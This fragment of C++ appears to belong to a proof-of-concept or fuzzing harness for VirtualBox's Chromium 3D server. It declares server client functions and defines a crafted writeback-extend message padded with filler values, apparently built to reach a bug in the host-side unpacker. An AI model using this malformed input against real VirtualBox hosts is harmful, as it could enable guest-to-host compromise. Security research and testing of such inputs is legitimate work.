
#define PREDEFINED_CLIENT_ID 0x1

uint8_t*  g_pBuffer = NULL;
uint8_t*  g_rpBuffer = NULL;
uint32_t  g_cbBuffer = 0;

#define CR_PROTOCOL_VERSION_MAJOR 9
#define CR_PROTOCOL_VERSION_MINOR 1

#define CR_MESSAGE_OPCODES            0x77474c01
#define CR_EXTEND_OPCODE              247
#define CR_WRITEBACK_EXTEND_OPCODE    302

uint32_t crUnpackExtendWritebackMsg[] = {
  CR_MESSAGE_OPCODES, //
  0x49494949,
  0x1,
  static_cast<uint32_t>(CR_EXTEND_OPCODE << 24),
  0xDEADBEEF,
  CR_WRITEBACK_EXTEND_OPCODE,
  0x41414141,
  0x42424242,
  0x43434343,
  0x44444444,
  0x45454545
};

extern "C" bool crVBoxServerInit(void);
extern "C" void crVBoxServerTearDown(void);
extern "C" int32_t crVBoxServerAddClient(uint32_t u32ClientID);
extern "C" void crVBoxServerRemoveClient(uint32_t u32ClientID);
extern "C" int32_t crVBoxServerClientWrite(uint32_t u32ClientID, uint8_t *pBuffer, uint32_t cbBuffer);
extern "C" int32_t crVBoxServerClientRead(uint32_t u32ClientID, uint8_t *pBuffer, uint32_t *pcbBuffer);
extern "C" int32_t crVBoxServerClientSetVersion(uint32_t u32ClientID, uint32_t vMajor, uint32_t vMinor);